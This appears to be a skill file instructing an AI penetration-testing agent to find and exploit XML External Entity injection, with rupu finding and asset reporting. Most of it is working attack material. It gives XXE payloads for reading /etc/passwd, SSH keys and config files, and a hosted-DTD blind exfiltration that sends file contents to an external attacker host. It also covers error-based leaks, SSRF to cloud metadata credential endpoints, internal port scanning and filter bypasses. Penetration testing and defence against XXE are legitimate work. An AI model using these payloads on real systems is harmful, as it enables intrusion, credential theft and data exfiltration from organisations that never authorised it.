---
name: xxe-testing
description: Detect and exploit XML External Entity injection (WSTG-INPV-07, CWE-611) in any XML-parsing endpoint — SOAP, SAML, XML APIs, RSS, SVG/DOCX/XLSX uploads — covering in-band file read, php://filter source disclosure, blind/OOB exfiltration via parameter entities and a hosted DTD with interactsh, error-based leaks, and SSRF-via-XXE to internal services and cloud metadata, with rupu-wired work units, assets, and findings. Use whenever a target accepts or can be coaxed into accepting XML.
license: Apache-2.0
metadata:
  author: Section9Labs
  wstg: WSTG-INPV-07
  cwe: CWE-611
---

# XXE (XML External Entity) Testing

Goal: find every endpoint that parses XML, prove external-entity resolution,
read files in-band or exfiltrate them out-of-band, pivot to SSRF against
internal services and cloud metadata, and record everything as rupu assets +
findings.

Depth lives in:
- `references/payloads.md` — full payload set: classic, blind parameter-entity, hosted DTD, error-based, php://filter, SSRF, billion-laughs note.
- `references/delivery.md` — content-type pivots, SOAP/SAML, SVG and Office-doc upload, XXEinjector, Burp.
- `references/rupu.md` — exact JSON shapes for work units, `assets.mark`, `findings.report`.

## 1. Find XML sinks

Anything that parses XML is in scope for this class:
- Bodies with `Content-Type: application/xml`, `text/xml`, `application/soap+xml`.
- SOAP services (`?wsdl`), SAML endpoints (POSTed base64 `SAMLResponse`), XML-RPC.
- File uploads that get parsed: SVG (image uploaders/thumbnailers), DOCX/XLSX/PPTX
  (zip-of-XML), ODT, PDF-XFA, RSS/Atom importers, sitemap fetchers.
- JSON endpoints that *also* accept XML: resend the same request with
  `Content-Type: application/xml` and the JSON converted to XML. A parser error
  mentioning XML (`org.xml.sax...`, `libxml`, `XmlException`) means the sink
  exists. See `references/delivery.md`.

Mark each sink as `assets.mark` kind `web:route` depth `mapped` (shapes in
`references/rupu.md`), then generate per-sink work units:

```
python3 scripts/gen_xxe.py --sinks sinks.txt --file /etc/passwd \
    --callback cbx7.oast.pro --out payloads/ --work-units units.json
```

`units.json` is a JSON array — hand it to the `work-units` skill / a
`for_each:` step so each sink is tested as its own unit.

## 2. Detection probes (cheap → loud)

Send in this order; a change at any step is signal:

1. **Well-formedness check** — break the XML (`<foo>`), confirm the parser
   actually runs (XML error vs generic 400).
2. **Internal entity** — proves DTD processing without touching the network:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x "xxeprobe">]>
   <r>&x;</r>
   ```
   `xxeprobe` reflected = entities expand → go straight to file read.
3. **OOB entity** — proves *external* resolution even when nothing reflects.
   Start `interactsh-client -json -o oast.jsonl -v`, then:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY % p SYSTEM "http://u1-sink.cbx7.oast.pro/x"> %p;]>
   <r>ping</r>
   ```
   A DNS or HTTP interaction in `oast.jsonl` = external entities enabled.
   DNS-only hit = resolution happens but HTTP egress may be blocked — error-based
   or FTP exfil channels still work (see `references/payloads.md`).

## 3. In-band file read

Pick an element whose value is reflected in the response (a name, message, id —
observe the normal response first), then substitute the entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r><name>&xxe;</name></r>
```

- Windows: `file:///c:/windows/win.ini`.
- Binary/multiline files that break XML (`<` in content) and PHP source:
  use the PHP filter wrapper (PHP targets only) —
  `php://filter/convert.base64-encode/resource=/etc/passwd` or
  `...resource=config.php` — the response carries base64; decode it.
- Java: `file:///etc/` style directory listing works on some parsers;
  `netdoc:` as a `file:` alternative on old JDKs.

High-value reads: `/etc/passwd` (proof), app config
(`/var/www/html/config.php`, `WEB-INF/web.xml` via relative path), SSH keys,
`/proc/self/environ`, cloud credentials files.

## 4. Blind / OOB exfiltration

When nothing reflects, use parameter entities plus a DTD you host.
`gen_xxe.py` writes both halves. Host the DTD:

```
cd payloads/ && python3 -m http.server 80    # on 198.51.100.7
```

Payload sent to the target:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://198.51.100.7/exfil.dtd"> %ext; %wrap; %send;
]>
<r>x</r>
```

`exfil.dtd` (hosted — nesting `%file;` inside another entity definition is only
legal in an *external* DTD, which is why hosting is required):

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://198.51.100.7/leak?d=%file;'>">
```

Read the file contents from your HTTP server log / interactsh HTTP interaction
(`?d=root:x:0:0...`). Multi-line files break URLs — prefer the **error-based**
variant, which leaks via the parser's own error message and needs no egress for
the data (only for fetching the DTD):

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
```

→ response error: `java.io.FileNotFoundException: /nonexistent/root:x:0:0:...`.
Fully-blind + no outbound at all: the local-DTD redefinition trick
(`references/payloads.md` §5) abuses a DTD already on the target's disk.

## 5. SSRF via XXE

Point the entity at internal URLs; read the response in-band (reflected
element) or infer from timing/errors:

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
```

Then fetch the role name, then
`.../security-credentials/<role>` for keys. Other targets:
`http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Azure,
needs header — usually fails via XXE; GCP needs `Metadata-Flavor` too, so AWS
IMDSv1 and Alibaba `http://100.100.100.200/latest/meta-data/` are the usual
wins), internal admin panels (`http://192.0.2.10:8080/manage`), and port
scanning by response-time/error differentials across `http://192.0.2.10:1-65535`.

## 6. Delivery variants

Covered fully in `references/delivery.md`:
- **Content-type pivot**: JSON→XML resend; `Content-Type: application/xml` on
  endpoints that sniff the body.
- **SVG upload**: SVG is XML — a `<text>&xxe;</text>` element renders file
  contents into the generated thumbnail/preview.
- **Office docs**: unzip DOCX/XLSX, inject the DOCTYPE into
  `[Content_Types].xml` or `word/document.xml`, rezip, upload.
- **SOAP/SAML**: DOCTYPE above the Envelope; SAML via decoded `SAMLResponse`.
- **XXEinjector** automation: `ruby XXEinjector.rb --host=198.51.100.7
  --path=/etc/passwd --file=req.txt --oob=http` (also `--oob=ftp` for
  multiline on Java). Burp Pro's scanner + Collaborator covers these checks
  passively — run an audit on every XML request you captured.

## 7. Parse, record, hand off (rupu — required)

Every result ends in rupu-ingestible output (see `references/rupu.md`):

```
# After testing, record confirmations:
python3 scripts/gen_xxe.py --results results.json \
    --findings findings.json --assets assets.json
```

- `results.json` (you write it during testing): list of
  `{url, vector, payload, file_read|ssrf_target, evidence:{request,response,oob}, confirmed}`.
- `findings.json` — `findings.report` payloads: scope `endpoint`,
  `target_ref` = sink URL, severity `high` (SSRF/limited read) or `critical`
  (arbitrary file read / credential theft), classification WSTG-INPV-07 /
  CWE-611, evidence with the HTTP exchange + leaked data sample. File each via
  the `finding-report` skill.
- `assets.json` — `assets.mark` payloads: `web:route` depth `exploited` for
  confirmed XXE, `tested` for probed-clean sinks. Record via the
  `coverage-assets` skill.

## 8. Decision table

| Observation | Conclusion | Next |
|---|---|---|
| Internal entity reflected | DTD processing on | classic file read §3 |
| OOB hit, nothing reflected | blind XXE | hosted-DTD exfil §4 |
| OOB DNS only, no HTTP | egress filtered | error-based leak; FTP channel (Java) |
| Entity error names the file content | error-based works | iterate target files |
| `DOCTYPE is disallowed` | DTD blocked | pivot: different endpoint/format, XInclude `<xi:include href="file:///etc/passwd" parse="text"/>`, UTF-16/encoding tricks |
| Parser error only on malformed XML, entities inert | hardened parser | mark route `tested`, move on |
